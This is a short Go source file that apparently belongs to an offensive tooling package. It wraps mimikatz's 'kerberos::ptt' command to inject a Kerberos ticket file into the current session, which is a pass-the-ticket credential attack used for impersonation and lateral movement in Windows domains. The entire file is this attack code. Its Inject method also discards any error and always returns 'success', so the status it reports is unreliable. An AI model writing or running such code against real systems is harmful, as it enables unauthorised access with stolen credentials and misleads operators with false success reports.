package kerberos

import "os/exec"

type TicketInjectResult struct {
	Status string
}

type TicketInject struct {
	TicketFile string
}

func (t TicketInject) Inject() TicketInjectResult {
	cmd := exec.Command("mimikatz.exe", "kerberos::ptt", t.TicketFile)
	cmd.Run()
	return TicketInjectResult{Status: "success"}
}
